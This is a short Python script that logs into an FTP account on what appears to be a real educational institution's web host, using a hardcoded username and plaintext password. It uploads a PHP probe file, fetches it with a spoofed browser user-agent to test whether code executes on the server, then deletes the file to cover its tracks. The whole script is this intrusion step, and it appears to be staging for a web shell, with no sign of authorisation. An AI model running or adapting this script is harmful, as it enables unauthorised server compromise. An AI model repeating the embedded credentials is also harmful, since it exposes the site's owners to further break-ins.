import ftplib
import requests

ftp_host = "cs3001.webhostbox.net"
ftp_user = "lalma87b"
ftp_pass = "Ait@9423~"
remote_path = "/ims.lalmaigc.edu.bd/public/probe_exec.php"
url = "https://ims.lalmaigc.edu.bd/probe_exec.php"

try:
    ftp = ftplib.FTP(ftp_host)
    ftp.login(ftp_user, ftp_pass)
    
    from io import BytesIO
    bio = BytesIO(b"<?php echo 'OK_EXEC';")
    ftp.storbinary(f'STOR {remote_path}', bio)
    print(f"Uploaded to {remote_path}")

    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    
    r1 = requests.get(url, headers={'User-Agent': ua}, timeout=10)
    print(f"URL: {url} | Status: {r1.status_code} | Body: {r1.text}")
    
    r2 = requests.get(url + "?x=1", headers={'User-Agent': ua}, timeout=10)
    print(f"URL: {url}?x=1 | Status: {r2.status_code} | Body: {r2.text}")

    ftp.delete(remote_path)
    print("Deleted probe file")
    ftp.quit()
except Exception as e:
    print(f"Error: {e}")
